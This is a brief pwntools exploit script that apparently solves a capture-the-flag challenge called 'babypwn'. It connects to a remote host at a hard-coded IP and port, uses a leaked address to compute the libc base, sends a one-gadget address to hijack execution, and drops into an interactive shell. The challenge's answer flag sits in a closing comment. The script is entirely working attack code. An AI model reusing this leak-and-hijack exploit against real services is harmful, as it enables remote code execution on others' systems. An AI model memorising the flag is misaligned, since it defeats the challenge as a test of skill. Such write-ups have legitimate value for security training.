from pwn import *

# r = process("./babypwn")
r = remote("45.76.161.20", 19509)
leak = u32(r.recv(4))
libc_base = leak - 0xd80 - 0x1d8000
log.info("Leaked: " + hex(libc_base))
sh = libc_base + 0x3d0d5
log.info("Shell: " + hex(sh))
sh = -(2**32 - sh) if sh > 0x7fffffff else sh
# pause()
r.sendline(str(sh))
# pause()
r.interactive()

# wgmy{b20208102bc4242bb10197edec8f3bb9}